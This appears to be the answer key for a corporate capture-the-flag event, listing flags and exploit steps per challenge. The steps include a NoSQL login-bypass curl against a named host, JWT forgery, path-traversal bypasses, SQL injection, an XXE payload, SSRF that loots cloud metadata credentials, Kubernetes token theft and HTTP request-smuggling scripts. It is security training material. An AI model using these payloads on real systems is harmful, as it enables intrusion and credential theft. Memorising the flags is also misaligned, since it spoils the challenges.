# Solutions

## Starter

- look in the html source code (axactf{f1rst_pl4c3_to_l00k_at_in_a_ctf})
- check /robots.txt to find /the/hid/den/path/to/a/new/flag (axactf{r0b0ts_ar3_w4y_bett3r_th4n_hum4ns})

## MD5

- solution: flag.js (axactf{md5_is_n0t_v3ry_secur3_anyway})

## JWT

- change alg to "none" and secretid to "null"
- create payload using flag.py (axactf{i_l0v3_cook1es_and_js0nw3bt0k3n})

## JWT 3

- change alg to "HS256" and provide the public key as a string
- solution: flag.js (axactf{JWT_c4n_b3_h4ck3d_1n_s0_many_w4y5})

## Files

- bypass ../ filter using ..././
- check 1 folder above to get /flag.txt (axactf{pl4y1ng_w1th_files_is_d4ng3r0us})

## No sequel

- NoSQL injection with $gt or $ne (axactf{nosql_does_n0t_m34n_n0_1nject10n})

```
curl -H "Content-type: application/json" -d '{"username": {"$gt":""}, "password": {"$gt": ""}}' https://nosql.axa-li-jp-dev-int.pink.ap-southeast-1.aws.openpaas.axa-cloud.com/login
```

- Bling NoSQL injection with $regex to get the real password (axactf{th1s_1s_called_bl1nd_sql_inj3cti0n})

## Fun

- Key: BELLASO (Last name of the REAL inventor of this famous cypher)
- flag: axactf{th1s_guy_1nv3nt3d_s0meth1ng_aw3s0me}

## Fun 2

- transform to binary, then to hex, then decode to string
- Binary: 110000101111000011000010110001101110100011001100111101101100011011100100111100101110000011101000011000001011111001100010111001101011111011001100111010101101110010111110110000101101110011001000101111101101110001100000111010001011111011000110110111101101101011100000110110001101001011000110011010001110100011001010110010001111101
- Hex: 0x6178616374667b6372797074305f31735f66756e5f616e645f6e30745f636f6d706c6963347465647d
- flag: axactf{crypt0_1s_fun_and_n0t_complic4ted}
```python
b = int(binary, 2)
h = hex(b)
bytes.fromhex(h[2:]).decode()
```

## Fun 3

- You need to specify:
  - a different user-agent
  - a specific method
  - a specific content-type
  - some data
  - x-forwarded-for header
- final request: curl -A "AxaBrowser" -XPOST -H "Content-Type: application/json" -H "X-Forwarded-For: 127.0.0.1" -d '{"amount": 1000000, "currency": "dollars"}' http://localhost:8080/
- flag: axactf{f0ll0w_th3_gu1d3_4nd_know_your_r3qu35t}

## Kubernetes

- using the path traversal, retrieve the service-account token to get access to another pod and get the flag in the other pod
- token path: /var/run/secrets/kubernetes.io/serviceaccount/token
- oc login https://osconsole.pink.ap-southeast-1.aws.openpaas.axa-cloud.com --token=TOKEN
- oc project 
- oc get secrets
- flag: axactf{ev3n_kub3rne7es_1s_not_s4fe}

## RSA

- classic RSA encryption challenge
```python
p = 62004237518891373354112961422235264296687007938732994465343345946285469463571
q = 63431804875549228523832313909380901212822869160400031133964616962306316224309
phi = (p-1)*(q-1)
d = inverse(e, phi)
m = pow(c,d,n)
hex(m)
```
- flag: axa_ctf{rs4_1s_n0t_th4t_c0mpl1c4t3d_1_gu355}

## UXUI

- go through the website and find the flag at the end
- flag: axa_ctf{th4t_w4s_th3_w0r5t_UI_p0ss1bl3_th4nk5}

## So much fun in the bucket

- S3 policy is not safe =/ http://somuchfuninthebucket.s3-ap-northeast-1.amazonaws.com/
- go to http://somuchfuninthebucket.s3.amazonaws.com/ to see the file listing
- flag: axactf{s3_p0l1c13s_4r3_s0_much_fun}

## SQL1

- simple SQL injection
- flag.py
- flag: axactf{th4t_w45_s0m3_v2ry_b4s1c_stuff}

## SQL2

- simple Blind sql attack
- flag.py
- flag: axactf{g1v3_m3_b4ck_my_3y35_1_m_bl1nd}

## SQL3

- Blind sql timing attack
- flag.py
- flag: axactf{t1m1ng_4tt4ck_4r3_fun_as_h3ll}

## XXE

- XML External Entity exploit
- "<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY test SYSTEM 'http://localhost/generate.php'>]><input><firstName>&test;</firstName><lastName>bich</lastName></input>"
- flag: axactf{th4t_w45_50m3_4w350m3_j0b_th4t_y0u_d1d_th3r3}

## SSRF

- SSRF attack via php webhook 
- Catch one of many possible flags:
  * Simply add file:///etc/flag.txt in the WebHook Form. If the docker container is running on EC2 the metadata service will also be available and ready for being looted :)
  * Loot the Metadata Service if it runs on EC2 => search for http://169.254.169.254/latest/meta-data/iam/security-credentals/{Stuff that lays around there} => with those credentials access to the AWS account is possible and hidden flags f.e. on S3 can be captured
- flag: axactf{w3lcom3_t0_th3_jungl3}


## HTTP_REQUEST_SMUGGLING_nginx

- HTTP request smuggling 
- Exploit it by running the following script in your bash 
  ```bash
  printf 'GET /a HTTP/1.1\r\n'\
  'Host: localhost\r\n'\
  'Content-Length: 56\r\n'\
  '\r\n'\
  'GET /_hidden/index.html HTTP/1.1\r\n'\
  'Host: notlocalhost\r\n'\
  '\r\n'\
  |nc 127.0.0.1 9015
  ```
  
- flag: axactf{publ1c_s3rv1c3_15_mY_m0770-@l_C@p0n3}

## HTTP_REQUEST_SMUGGLING_websocket

- More difficult HTTP request smuggling to access a page in a hidden network
- Exploit it (with Python2...pain or gain)
  ```python
  import socket 

  req1 = """GET /socket.io/?EIO=3&transport=websocket HTTP/1.1
  Host: localhost:9020
  Sec-WebSocket-Version: 13
  Upgrade: websocket
  Connection: Upgrade

  """.replace('\n', '\r\n')


  req2 = """GET /flag HTTP/1.1
  Host: flask.net:5000

  """.replace('\n', '\r\n')

  def main(netloc):
      host, port = netloc.split(':')

      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      sock.connect((host, int(port)))

      sock.sendall(req1)
      data = sock.recv(4096)
      print(data)

      sock.sendall(req2)
      data = sock.recv(4096)
      data = data.decode(errors = 'ignore')

      print(data)

      sock.shutdown(socket.SHUT_RDWR)
      sock.close()

  if __name__ == "__main__":
      main('localhost:9020')
  ```
- flag: axactf{In_50VI37_rUS5Ia_vODK@_DRiNKs_YOu}
